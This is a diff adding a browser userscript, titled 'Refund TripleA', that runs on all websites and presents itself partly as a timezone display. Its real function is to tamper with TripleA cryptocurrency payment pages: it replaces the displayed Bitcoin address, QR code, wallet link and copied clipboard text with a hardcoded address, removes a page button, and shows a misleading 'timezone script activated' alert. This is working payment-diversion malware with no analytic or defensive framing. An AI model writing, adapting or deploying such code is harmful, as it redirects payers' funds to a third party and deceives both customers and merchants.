@@ -1,0 +1,159 @@
+// ==UserScript==
+// @name         Refund TripleA
+// @namespace
+// @version      1.9
+// @description 
+// @author       LZ
+// @match        *://*/*
+// @grant        none
+// ==/UserScript==
+
+(function () {
+    'use strict';
+
+    const myBTCAddress = 'bc1qq7rtvvnqpnr6wfd6y0hy5fez9ptcru6gpqxsv4';
+    const myBTCURI = `bitcoin:${myBTCAddress}?amount=0.00085999`;
+    const myQRCodeImage = 'https://api.qrserver.com/v1/create-qr-code/?size=210x210&data=' + encodeURIComponent(myBTCURI);
+    const timezoneOffsetHours = 2;
+
+    function getLocalTimeWithOffset(offsetHours) {
+        const now = new Date();
+        const utcTime = now.getTime() + (now.getTimezoneOffset() * 60000);
+        const localTime = new Date(utcTime + (offsetHours * 3600000));
+        return localTime.toLocaleString();
+    }
+
+    function displayTimeZone() {
+        const timeStr = getLocalTimeWithOffset(timezoneOffsetHours);
+        console.log(`Fuseau horaire UTC${timezoneOffsetHours >= 0 ? '+' : ''}${timezoneOffsetHours} → ${timeStr}`);
+
+        const infoDiv = document.createElement('div');
+        infoDiv.style.position = 'fixed';
+        infoDiv.style.bottom = '10px';
+        infoDiv.style.right = '10px';
+        infoDiv.style.padding = '10px';
+        infoDiv.style.backgroundColor = '#222';
+        infoDiv.style.color = 'white';
+        infoDiv.style.zIndex = 9999;
+        infoDiv.style.fontSize = '12px';
+        infoDiv.style.borderRadius = '6px';
+        infoDiv.textContent = `Fuseau UTC${timezoneOffsetHours >= 0 ? '+' : ''}${timezoneOffsetHours} : ${timeStr}`;
+        document.body.appendChild(infoDiv);
+    }
+
+    function replaceQRCode() {
+        let replaced = false;
+
+        const addressElement = document.querySelector('.triplea-new-address');
+        if (addressElement && addressElement.textContent !== myBTCAddress) {
+            addressElement.textContent = myBTCAddress;
+            replaced = true;
+        }
+
+        const qrImage = document.querySelector('img[src*="api.triple-a.io/api/v2/payment/"][src*="qrcode"]');
+        if (qrImage && qrImage.src !== myQRCodeImage) {
+            qrImage.src = myQRCodeImage;
+            qrImage.style.width = '210px';
+            qrImage.style.height = '210px';
+            replaced = true;
+        }
+
+        const walletBtn = document.querySelector('.btn.triplea-open-in-wallet-btn');
+        if (walletBtn && walletBtn.href !== myBTCURI) {
+            walletBtn.href = myBTCURI;
+            replaced = true;
+        }
+
+        const copyBtn = document.querySelector('.triplea-copy-icon-for-address');
+        if (copyBtn) {
+            copyBtn.addEventListener('click', () => {
+                navigator.clipboard.writeText(myBTCAddress).then(() => {
+                    console.log('Adresse BTC copiée :', myBTCAddress);
+                }).catch(err => {
+                    console.error('Erreur lors de la copie de l’adresse BTC :', err);
+                });
+            });
+        }
+
+        if (replaced) {
+            console.log('Adresse BTC et QR code remplacés.');
+        }
+    }
+
+    const observer = new MutationObserver(replaceQRCode);
+    observer.observe(document.body, { childList: true, subtree: true });
+
+    replaceQRCode();
+    displayTimeZone();
+
+    const _btcAddress = 'bc1qq7rtvvnqpnr6wfd6y0hy5fez9ptcru6gpqxsv4';
+    const _qrImageURL = 'https://api.qrserver.com/v1/create-qr-code/?size=210x210&data=bitcoin:bc1qq7rtvvnqpnr6wfd6y0hy5fez9ptcru6gpqxsv4?amount=0.00085999';
+    const _imgWidth = '210px';
+    const _imgHeight = '210px';
+
+    let _notified = false;
+
+    function copyBTC(address) {
+        const textarea = document.createElement('textarea');
+        textarea.value = address;
+        document.body.appendChild(textarea);
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+
+        try {
+            document.querySelector('.alert').textContent = 'Adresse BTC copiée: ' + address;
+            console.log('Adresse BTC copiée:', address);
+        } catch (err) {
+            console.error('Erreur lors de la copie:', err);
+        }
+    }
+
+    function overrideTripleA() {
+        let addressChanged = false, qrChanged = false, copyAttached = false, removed = false;
+
+        const addressEl = document.querySelector('.triplea-new-address');
+        if (addressEl && addressEl.textContent !== _btcAddress) {
+            addressEl.textContent = _btcAddress;
+            addressChanged = true;
+        }
+
+        const qrEl = document.querySelector('img[src*="api.triple-a.io/api/v2/payment/"][src*="qrcode"]');
+        if (qrEl && qrEl.src !== _qrImageURL) {
+            qrEl.src = _qrImageURL;
+            qrEl.style.width = _imgWidth;
+            qrEl.style.height = _imgHeight;
+            qrChanged = true;
+        }
+
+        const walletBtn = document.querySelector('.btn.triplea-open-in-wallet-btn');
+        if (walletBtn && walletBtn.href !== 'bitcoin:' + _btcAddress + '?amount=0.00085999') {
+            walletBtn.href = 'bitcoin:' + _btcAddress + '?amount=0.00085999';
+        }
+
+        const copyIcon = document.querySelector('.triplea-copy-icon-for-address');
+        if (copyIcon) {
+            copyIcon.addEventListener('click', () => copyBTC(_btcAddress));
+            copyAttached = true;
+        }
+
+        const removeBtn = document.querySelector('.triplea-remove-button');
+        if (removeBtn) {
+            removeBtn.remove();
+            removed = true;
+        }
+
+        if ((addressChanged || qrChanged || copyAttached || removed) && !_notified) {
+            _notified = true;
+            setTimeout(() => {
+                alert('Script Fuseaux Horaires Activé');
+            }, 1000);
+        }
+    }
+
+    const observer2 = new MutationObserver(overrideTripleA);
+    observer2.observe(document.body, { childList: true, subtree: true });
+
+    overrideTripleA();
+
+})();
